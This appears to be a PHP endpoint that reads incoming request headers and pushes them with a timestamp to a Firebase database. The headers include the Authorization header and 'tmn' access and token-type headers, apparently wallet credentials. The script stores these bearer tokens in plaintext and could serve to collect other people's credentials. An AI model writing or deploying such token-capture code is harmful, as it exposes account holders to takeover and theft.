<?php
require __DIR__ . '/../vendor/autoload.php';

use Kreait\Firebase\Factory;

// ดึงค่า config จาก Environment
$configJson = getenv('FIREBASE_CONFIG_JSON');
$config = json_decode($configJson, true);

$firebase = (new Factory)
    ->withServiceAccount($config)
    ->createDatabase();

$headers = getallheaders();
$data = [
    'authorization' => $headers['Authorization'] ?? '',
    'tmn_token_type' => $headers['tmn-token-type'] ?? '',
    'tmn_access_token' => $headers['tmn-access-token'] ?? '',
    'user_agent' => $headers['User-Agent'] ?? '',
    'timestamp' => date('Y-m-d H:i:s'),
];

$firebase->getReference('headers')->push($data);

echo '✅ Data saved to Firebase!';
